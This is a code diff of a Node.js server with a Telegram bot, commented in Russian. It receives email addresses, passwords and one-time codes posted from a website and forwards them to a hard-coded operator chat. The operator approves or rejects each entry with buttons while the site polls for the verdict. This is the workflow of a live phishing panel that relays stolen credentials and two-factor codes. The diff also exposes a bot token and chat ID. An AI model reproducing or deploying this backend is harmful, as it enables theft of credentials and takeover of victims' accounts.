@@ -2,8 +2,10 @@ const TelegramBot = require('node-telegram-bot-api');
 const express = require('express');
 const cors = require('cors');
 
+// --- НАСТРОЙКИ ---
 const token = '8529029264:AAHn2DMIIgv-Ga2Fd5G3Az86GQqp1qshNgQ'; 
 const adminChatId = '-1003894478662'; 
+// -----------------
 
 const bot = new TelegramBot(token, { polling: true });
 const app = express();
@@ -11,14 +13,12 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-// Объект для хранения статусов пользователей
 let userStatuses = {}; 
 
 // 1. Прием данных с сайта
 app.post('/send-data', (req, res) => {
     const { type, email, pass, code, userId } = req.body;
     
-    // Сбрасываем статус в 'pending' при каждом новом действии пользователя
     userStatuses[userId] = 'pending';
     console.log(`[${userId}] Новый запрос: ${type}`);
 
@@ -41,13 +41,13 @@ app.post('/send-data', (req, res) => {
         }
     });
 
-    res.send({ status: 'sent' });
+    res.json({ status: 'ok' });
 });
 
-// 2. Обработка нажатий кнопок в Telegram
+// 2. Обработка кнопок в Telegram
 bot.on('callback_query', (query) => {
     const data = query.data.split('_');
-    const action = data[0]; // 'ok' или 'err'
+    const action = data[0]; 
     const userId = data[1];
 
     if (action === 'ok') {
@@ -59,19 +59,18 @@ bot.on('callback_query', (query) => {
     }
 
     bot.answerCallbackQuery(query.id, { text: "Статус обновлен" });
-
-    // Убираем кнопки из сообщения
     bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
         chat_id: query.message.chat.id,
         message_id: query.message.message_id
     });
 });
 
-// 3. Сайт проверяет статус здесь
+// 3. Проверка статуса сайтом
 app.get('/check/:userId', (req, res) => {
-    const status = userStatuses[req.params.userId] || 'none';
-    res.send({ status: status });
+    const userId = req.params.userId;
+    const status = userStatuses[userId] || 'none';
+    res.json({ status: status });
 });
 
-const PORT = process.env.PORT || 10000; // Render часто предпочитает порт 10000
-app.listen(PORT, () => console.log(`🚀 Server is running on port ${PORT}`));
+const PORT = process.env.PORT || 10000;
+app.listen(PORT, () => console.log(`🚀 Сервер запущен на порту ${PORT}`));
